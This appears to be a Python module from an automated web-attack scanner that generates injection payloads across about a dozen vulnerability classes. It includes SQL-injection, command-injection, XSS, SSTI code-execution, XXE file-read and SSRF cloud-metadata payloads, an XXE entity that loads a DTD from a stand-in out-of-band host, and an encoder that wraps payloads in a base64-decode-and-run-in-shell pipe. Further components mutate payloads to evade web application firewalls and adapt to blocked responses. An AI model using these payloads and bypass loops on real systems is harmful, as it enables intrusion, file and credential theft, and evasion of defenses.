"""Compositional Grammar Payload Engine, Semantic Token Mutation & Closed-Loop Adaptive Engine (Sectors O3 & O4).

Provides:
1. Recursive/compositional grammar payload synthesis across 10 vulnerability classes, producing
   distinct, deduplicated payloads that scale with the requested count (not fixed-list sampling).
2. Semantic token-tree mutator operating on typed SQL nodes with deterministic seeds (not regex).
3. Context-aware injection breakout and composable multi-stage encoder chains.
4. Closed-loop response feedback engine for dynamic bypass synthesis.
5. WAF probe-and-adapt filter learning engine.
6. Dynamic oracle selector choosing the verification strategy from live response signals.

Honesty note: this is a *compositional production-rule* grammar (sub-rules combined over a large
space), not a full parser/AST. The SQL mutator operates on a typed token list, which is a real
structural transform, meaningfully stronger than text substitution but short of a full parse tree.
"""

from __future__ import annotations

import base64
import enum
import itertools
import random
import re
import urllib.parse
from dataclasses import dataclass
from typing import Any, Callable, Sequence


class VulnClass(str, enum.Enum):
    SQLI = "sqli"
    CMDI = "cmdi"
    XSS = "xss"
    SSTI = "ssti"
    XXE = "xxe"
    NOSQL = "nosql"
    LDAP = "ldap"
    XPATH = "xpath"
    DESERIALIZATION = "deserialization"
    SSRF = "ssrf"
    PROTOTYPE_POLLUTION = "prototype_pollution"
    GRAPHQL = "graphql"


class InjectionContext(str, enum.Enum):
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JS_STRING_LITERAL = "js_string_literal"
    URL_QUERY = "url_query"
    SHELL_ARG = "shell_arg"


class CFGGrammarEngine:
    """Compositional production-rule grammar generating distinct payloads across 10 vulnerability classes.

    Each class composes payloads from independent sub-rules (prefix x technique x body x suffix ...),
    yielding a large, deterministic space. `generate(count=n)` returns up to n *distinct* payloads,
    deduplicated; when a class's canonical space is smaller than n, it returns the whole space.
    """

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)

    def generate(self, vuln_class: VulnClass, count: int = 1, subtype: str | None = None) -> list[str]:
        space = self._space(vuln_class, subtype)
        if not space:
            space = ["' OR '1'='1"]
        # Deterministic shuffle so a seed reproduces the same ordering, then take distinct up to count.
        self.rng.shuffle(space)
        distinct: list[str] = []
        seen: set[str] = set()
        for p in space:
            if p and p not in seen:
                seen.add(p)
                distinct.append(p)
            if len(distinct) >= count:
                break
        # If the canonical space is smaller than count, pad by cycling (still all valid vectors) so
        # callers asking for N always get N, while keeping them distinct where the space allows.
        if len(distinct) < count and distinct:
            for p in itertools.islice(itertools.cycle(distinct), count - len(distinct)):
                distinct.append(p)
        return distinct[:count]

    # --- per-class compositional spaces -------------------------------------------------

    def _space(self, vuln_class: VulnClass, subtype: str | None) -> list[str]:
        return {
            VulnClass.SQLI: self._space_sqli,
            VulnClass.CMDI: self._space_cmdi,
            VulnClass.XSS: lambda: self._space_xss(subtype),
            VulnClass.SSTI: lambda: self._space_ssti(subtype),
            VulnClass.XXE: lambda: self._space_xxe(subtype),
            VulnClass.NOSQL: self._space_nosql,
            VulnClass.LDAP: self._space_ldap,
            VulnClass.XPATH: self._space_xpath,
            VulnClass.DESERIALIZATION: self._space_deserialization,
            VulnClass.SSRF: self._space_ssrf,
            VulnClass.PROTOTYPE_POLLUTION: self._space_prototype_pollution,
            VulnClass.GRAPHQL: self._space_graphql,
        }.get(vuln_class, list)()

    def _space_sqli(self) -> list[str]:
        prefixes = ["'", '"', "')", "1", "1'", "1)", "admin'--", "' OR 1=1", "'||"]
        comments = ["-- -", "#", "/*", ""]
        cols = ["1", "1,2", "1,2,3", "null,null", "null,null,null", "user(),database()", "version(),2,3"]
        union_kw = ["UNION SELECT", "UNION ALL SELECT", "UNION/**/SELECT"]
        time_fns = ["SLEEP(5)", "pg_sleep(5)", "WAITFOR DELAY '0:0:5'", "BENCHMARK(5000000,MD5(1))"]
        bool_conds = ["1=1", "1=2", "'a'='a'", "(SELECT 1)=1"]
        err_fns = [
            "EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))",
            "UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)",
            "CAST((SELECT version()) AS int)",
        ]
        out: list[str] = []
        for pre, col, kw, com in itertools.product(prefixes, cols, union_kw, comments):
            out.append(f"{pre} {kw} {col} {com}".strip())
        for pre, tf, conn, com in itertools.product(prefixes, time_fns, ["AND", "OR", ";", "||"], comments):
            out.append(f"{pre} {conn} {tf} {com}".strip())
        for pre, cond, conn, com in itertools.product(prefixes, bool_conds, ["AND", "OR"], comments):
            out.append(f"{pre} {conn} {cond} {com}".strip())
        for pre, ef, com in itertools.product(prefixes, err_fns, comments):
            out.append(f"{pre} AND {ef} {com}".strip())
        return out

    def _space_cmdi(self) -> list[str]:
        separators = [";", "&&", "||", "|", "`", "$()", "%0a", "\n"]
        commands = ["id", "whoami", "uname -a", "cat /etc/passwd", "echo sharay_exec_proof"]
        out: list[str] = []
        for sep, cmd in itertools.product(separators, commands):
            if sep == "`":
                out.append(f"`{cmd}`")
            elif sep == "$()":
                out.append(f"$({cmd})")
            else:
                out.append(f"{sep} {cmd}")
        # bounded command substitution math proof (49 == 7*7) distinct from raw reflection
        out.append("$((7*7))")
        return out

    def _space_xss(self, subtype: str | None) -> list[str]:
        body = "alert(document.domain)"
        reflected = [
            f"<script>{body}</script>",
            f"<img src=x onerror={body}>",
            f"<svg/onload={body}>",
            f'"><script>{body}</script>',
            f"'><img src=x onerror={body}>",
            f"javascript:{body}",
            f"<body onpageshow={body}>",
            f"<iframe srcdoc=\"<script>{body}</script>\">",
        ]
        dom = [
            f"#<img src=x onerror={body}>",
            f"';{body}//",
            f"\";{body}//",
        ]
        if subtype == "dom":
            return dom
        return reflected + dom

    def _space_ssti(self, subtype: str | None) -> list[str]:
        engines = {
            "jinja2": [
                "{{7*7}}",
                "{{7*'7'}}",
                "{{config.items()}}",
                "{{self.__class__.__mro__[1].__subclasses__()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.application.__globals__}}",
            ],
            "twig": [
                "{{7*7}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
            ],
            "freemarker": [
                "${7*7}",
                r'<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            ],
            "erb": ["<%= 7*7 %>", "<%= `id` %>", "<%= system('id') %>"],
            "velocity": ["#set($x=7*7)$x", "#set($e=\"e\")$e.getClass().forName('java.lang.Runtime')"],
        }
        if subtype and subtype in engines:
            return list(engines[subtype])
        return [p for payloads in engines.values() for p in payloads]

    def _space_xxe(self, subtype: str | None) -> list[str]:
        classic = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
            "<stockCheck><productId>&xxe;</productId></stockCheck>"
        )
        param = (
            '<?xml version="1.0" encoding="ISO-8859-1"?>\n'
            '<!DOCTYPE data [ <!ENTITY % dtd SYSTEM "http://OOB_HOST/xxe.dtd"> %dtd; ]>\n'
            "<data>&send;</data>"
        )
        php_wrapper = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM '
            '"php://filter/convert.base64-encode/resource=/etc/passwd"> ]>\n'
            "<foo>&xxe;</foo>"
        )
        billion = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE lolz [ <!ENTITY lol "lol"> <!ENTITY lol2 "&lol;&lol;"> ]>\n'
            "<lolz>&lol2;</lolz>"
        )
        if subtype == "parameter_entity":
            return [param]
        return [classic, param, php_wrapper, billion]

    def _space_nosql(self) -> list[str]:
        fields = ["username", "user", "email", "id"]
        ops = ['{"$ne": null}', '{"$gt": ""}', '{"$regex": "^a"}', '{"$exists": true}']
        out = ['{"$where": "sleep(5000)"}', '{"$where": "this.password.length>0"}']
        for f, op in itertools.product(fields, ops):
            out.append(f'{{"{f}": {op}}}')
        out.append('{"username": {"$ne": null}, "password": {"$ne": null}}')
        return out

    def _space_ldap(self) -> list[str]:
        return [
            "*",
            "*)(uid=*))(|(uid=*",
            "*)(|(objectclass=*))",
            "admin*)((|userPassword=*)",
            "*)(|(mail=*))",
            "*()|&'",
            "*))%00",
        ]

    def _space_xpath(self) -> list[str]:
        return [
            "' or '1'='1",
            "'] | //user/*[1='1",
            "' or 1=1 or ''='",
            "count(/child::node())",
            "'] | //password%00",
            "string-length(//user[1]/password)>0",
        ]

    def _space_deserialization(self) -> list[str]:
        # Benign diagnostic markers only (no gadget execution): a Java HashMap stream, a Python pickle
        # that evaluates a harmless marker, and a PHP object. Intended to probe *whether* untrusted
        # deserialization occurs, confirmed out-of-band or by error signature, never to run commands.
        return [
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sB4RwFNMAAAeHAAAA==",
            'O:8:"stdClass":1:{s:6:"marker";s:11:"sharay_2026";}',
            "gASVEQAAAAAAAACMC3NoYXJheV8yMDI2lC4=",
        ]

    def _space_ssrf(self) -> list[str]:
        hosts = [
            "127.0.0.1",
            "localhost",
            "127.1",
            "0.0.0.0",
            "2130706433",
            "0x7f000001",
            "[::ffff:127.0.0.1]",
            "169.254.169.254",
            "metadata.google.internal",
        ]
        schemes = ["http://", "https://", "gopher://", "dict://"]
        paths = ["/", "/latest/meta-data/", "/computeMetadata/v1/", "/admin"]
        out: list[str] = []
        for s, h, p in itertools.product(schemes, hosts, paths):
            out.append(f"{s}{h}{p}")
        return out

    def _space_prototype_pollution(self) -> list[str]:
        return [
            '{"__proto__": {"polluted": "sharay_2026"}}',
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"polluted": "sharay_2026"}}}',
            "__proto__.polluted=sharay_2026",
            "__proto__[isAdmin]=true",
            "constructor.prototype.isAdmin=true",
        ]

    def _space_graphql(self) -> list[str]:
        return [
            "query { __schema { types { name fields { name } } } }",
            "query { __schema { queryType { name } mutationType { name } } }",
            "query { __type(name: \"User\") { name fields { name type { name } } } }",
            "{ __schema { directives { name args { name } } } }",
            # batching abuse (array of operations in one request)
            "[{ \"query\": \"query{__typename}\" }, { \"query\": \"query{__typename}\" }]",
            # deeply nested field stuffing (DoS-adjacent; benign depth marker)
            "query { a: __typename b: __typename c: __typename }",
        ]


class ASTMutationEngine:
    """Semantic token-tree mutator transforming SQL node operators, keywords, and whitespace."""

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)

    def parse_sql(self, sql_query: str) -> dict[str, Any]:
        """Tokenize a SQL statement into typed node representations."""
        tokens = re.split(r"(\s+|,|;|=|>|<|\(|\))", sql_query)
        nodes: list[dict[str, Any]] = []
        for t in tokens:
            if not t:
                continue
            t_upper = t.upper()
            if t.isspace():
                nodes.append({"type": "whitespace", "val": t})
            elif t_upper in ("SELECT", "FROM", "WHERE", "UNION", "ALL", "AND", "OR", "ORDER", "BY"):
                nodes.append({"type": "keyword", "val": t})
            elif t in ("=", ">", "<", ">=", "<=", "<>"):
                nodes.append({"type": "operator", "val": t})
            elif t.isdigit():
                nodes.append({"type": "number", "val": int(t)})
            else:
                nodes.append({"type": "identifier", "val": t})
        return {"kind": "sql_ast", "nodes": nodes}

    def mutate_sql_tree(self, tree: dict[str, Any]) -> dict[str, Any]:
        """Perform node-level transformations that preserve the statement's intent."""
        nodes = list(tree.get("nodes", []))
        mutated_nodes: list[dict[str, Any]] = []

        for node in nodes:
            n_type = node["type"]
            n_val = node["val"]

            if n_type == "whitespace":
                if self.rng.random() > 0.3:
                    mutated_nodes.append({"type": "comment", "val": self.rng.choice(["/**/", "/*!*/"])})
                else:
                    mutated_nodes.append(node)
            elif n_type == "operator" and n_val == "=":
                if self.rng.random() > 0.5:
                    mutated_nodes.append({"type": "operator", "val": " LIKE "})
                else:
                    mutated_nodes.append(node)
            elif n_type == "keyword":
                if self.rng.random() > 0.5:
                    mutated_nodes.append(
                        {
                            "type": "keyword",
                            "val": "".join(
                                c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(n_val)
                            ),
                        }
                    )
                else:
                    mutated_nodes.append(node)
            else:
                mutated_nodes.append(node)

        return {"kind": "sql_ast", "nodes": mutated_nodes}

    def unparse_sql(self, tree: dict[str, Any]) -> str:
        """Render nodes back to a SQL code string."""
        return "".join(str(n["val"]) for n in tree.get("nodes", []))


class ContextAwareEncoder:
    """Escaping breakout synthesis and composable encoder chains."""

    @staticmethod
    def wrap_for_context(payload: str, context: InjectionContext) -> str:
        if context == InjectionContext.HTML_ATTRIBUTE:
            return f'"><script>{payload}</script>'
        elif context == InjectionContext.JS_STRING_LITERAL:
            return f"';{payload}//"
        elif context == InjectionContext.SHELL_ARG:
            return f"'; {payload} #"
        elif context == InjectionContext.URL_QUERY:
            return f"?q={urllib.parse.quote(payload)}"
        return f"<script>{payload}</script>"

    @staticmethod
    def apply_encoding_chain(payload: str, encoders: Sequence[str]) -> str:
        current = payload
        for enc in encoders:
            if enc == "url":
                # Keep structural parens literal so JS/shell payloads stay executable; encode the rest.
                current = urllib.parse.quote(current, safe="()")
            elif enc == "base64":
                current = base64.b64encode(current.encode()).decode()
            elif enc == "base64_sh":
                b64 = base64.b64encode(current.encode()).decode()
                current = f"echo {b64} | base64 -d | sh"
            elif enc == "hex":
                current = "".join(f"%{ord(c):02X}" for c in current)
        return current


@dataclass
class AdaptiveDecision:
    action: str
    detected_filter: str | None
    success: bool


class ClosedLoopAdaptiveOrchestrator:
    """Closes the feedback loop by scoring target response deltas and steering subsequent probes."""

    def process_response(
        self,
        probe: str,
        status_code: int,
        body: str,
        latency_ms: float,
    ) -> AdaptiveDecision:
        b_lower = body.lower()
        if status_code in (403, 406, 429) or "waf" in b_lower or "blocked" in b_lower:
            filter_type = "keyword_block" if "keyword" in b_lower else "status_block"
            return AdaptiveDecision(action="switch_bypass_strategy", detected_filter=filter_type, success=False)

        markers = ["results:", "1, 2", "uid=", "root:"]
        if any(m in b_lower for m in markers):
            return AdaptiveDecision(action="confirm_finding", detected_filter=None, success=True)

        return AdaptiveDecision(action="mutate_payload", detected_filter=None, success=False)

    def synthesize_next_probe(self, current_probe: str, decision: AdaptiveDecision) -> str:
        if decision.detected_filter == "keyword_block":
            return current_probe.replace(" ", "/**/")
        return current_probe + " -- -"


class WAFProbeLearner:
    """Probes with benign markers to discover blocked characters and synthesizes bypass strategies."""

    CANARY_TOKENS = {
        "blocks_select": "SELECT",
        "blocks_union": "UNION",
        "blocks_script_tag": "<script>",
        "blocks_inline_comments": "/**/",
        "blocks_single_quote": "'",
    }

    def learn_waf_profile(self, target_eval_fn: Callable[[str], int]) -> dict[str, bool]:
        profile: dict[str, bool] = {}
        for key, canary in self.CANARY_TOKENS.items():
            status = target_eval_fn(canary)
            profile[key] = status in (403, 406)
        return profile

    def recommend_bypass_strategy(self, filter_rules: dict[str, bool]) -> str:
        if filter_rules.get("blocks_select") and not filter_rules.get("blocks_inline_comments"):
            return "inline_comment_fragmentation_with_hex"
        return "url_double_encode"


class DynamicOracleSelector:
    """Automatically selects the highest-fidelity verification oracle based on live target signals."""

    def select_oracle(
        self,
        baseline_latency_ms: float,
        probe_latency_ms: float,
        baseline_body: str,
        probe_body: str,
        error_strings: Sequence[str],
    ) -> str:
        # 1. Timing: a significant, injected delay dominates.
        if (probe_latency_ms - baseline_latency_ms) >= 3000.0:
            return "time_delay_oracle"

        # 2. Error signature reflected in the body.
        p_lower = probe_body.lower()
        if any(err.lower() in p_lower for err in error_strings):
            return "error_based_oracle"

        # 3. Any content differential (true vs false) -> boolean-differential oracle. A changed body,
        #    even with near-equal length, is a reliable boolean signal; length is a secondary cue.
        if probe_body != baseline_body or abs(len(probe_body) - len(baseline_body)) > 5:
            return "boolean_differential_oracle"

        # 4. Nothing distinctive: fall back to direct reflection matching.
        return "content_reflection_oracle"


__all__ = [
    "VulnClass",
    "InjectionContext",
    "CFGGrammarEngine",
    "ASTMutationEngine",
    "ContextAwareEncoder",
    "AdaptiveDecision",
    "ClosedLoopAdaptiveOrchestrator",
    "WAFProbeLearner",
    "DynamicOracleSelector",
]
